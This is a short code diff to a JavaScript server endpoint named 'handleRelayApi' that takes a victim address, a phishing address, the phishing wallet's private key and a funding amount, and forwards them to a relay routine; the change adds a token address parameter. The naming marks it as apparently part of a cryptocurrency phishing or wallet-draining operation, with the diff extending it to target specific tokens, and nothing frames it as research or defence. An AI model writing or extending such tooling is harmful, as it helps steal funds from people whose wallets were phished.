@@ -109,7 +109,7 @@ async function handleRelayApi(req, res) {
         req.on('end', async () => {
             try {
                 const params = JSON.parse(body || '{}');
-                const { victimAddress, phishingAddress, phishingPrivateKey, fundAmount } = params;
+                const { victimAddress, phishingAddress, phishingPrivateKey, fundAmount, tokenAddress } = params;
 
                 if (!victimAddress || !phishingAddress || !phishingPrivateKey) {
                     res.writeHead(400, { 'Content-Type': 'application/json' });
@@ -131,6 +131,7 @@ async function handleRelayApi(req, res) {
                     phishingAddress,
                     phishingPrivateKey,
                     fundAmount: fundAmount || '0.0003',
+                    tokenAddress,
                 });
 
                 res.writeHead(200, { 'Content-Type': 'application/json' });
